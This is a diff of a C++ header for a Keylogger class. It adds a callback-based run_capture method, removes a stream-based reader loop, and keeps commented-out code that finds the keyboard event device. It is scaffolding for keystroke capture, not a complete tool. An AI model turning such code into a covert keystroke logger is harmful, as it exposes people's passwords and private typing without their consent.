@@ -1,9 +1,10 @@
-#pragma once 
+#pragma once
 
 #include <atomic>
 #include <string>
 #include <thread>
 #include <iostream>
+#include <functional>
 
 class Keylogger {
 public:
@@ -18,6 +19,8 @@ public:
     bool is_running() const;
     std::string get_last_error() const;
 
+    void run_capture(std::function<void(std::string)> callback);
+
 private:
     static constexpr size_t DEVICE_PATH_SIZE = 128;
     static constexpr size_t LINE_BUFFER_SIZE = 512;
@@ -25,7 +28,7 @@ private:
 
     bool find_keyboard_();
     bool open_device_();
-    void reader_loop_(std::ostream& output);
+    // void reader_loop_(std::ostream& output); // Removed
 
     std::string device_path_;
     int fd_;
@@ -66,7 +69,7 @@ private:
 
 //     while (fgets(line, sizeof(line), fp)) {
 //         if (strncmp(line, "H: Handlers=", 12) == 0) {
-//             if (strstr(line, "kbd")) { 
+//             if (strstr(line, "kbd")) {
 //                 char *p = strstr(line, "event");
 //                 if (p && sscanf(p, "%63s", event_name) == 1) {
 //                     snprintf(out_path, out_size,
